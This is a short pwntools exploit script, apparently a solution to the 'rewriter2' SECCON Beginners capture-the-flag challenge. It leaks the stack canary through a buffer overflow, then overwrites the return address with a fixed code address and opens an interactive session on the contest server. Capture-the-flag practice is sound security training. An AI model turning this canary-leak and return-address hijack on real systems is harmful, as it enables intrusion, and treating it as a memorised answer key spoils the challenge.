from pwn import *

host = 'rewriter2.beginners.seccon.games'
port = 9001
elf = ELF('rewriter2')
addr = elf.symbols['win']

io = remote(host, port)
#io = process(elf.path)
payload = b'a' * 0x28
payload += b'!'
io.sendafter(b'name? ', payload)

io.recvuntil(b'a!')
canary = u64(b'\x00' + io.recv(7))

payload = b'a' * 0x28
payload += p64(canary)
payload += b'a' * 0x8
#payload += p64(addr)
payload += p64(0x4012d6)
io.sendafter(b'you? ', payload)

io.interactive()
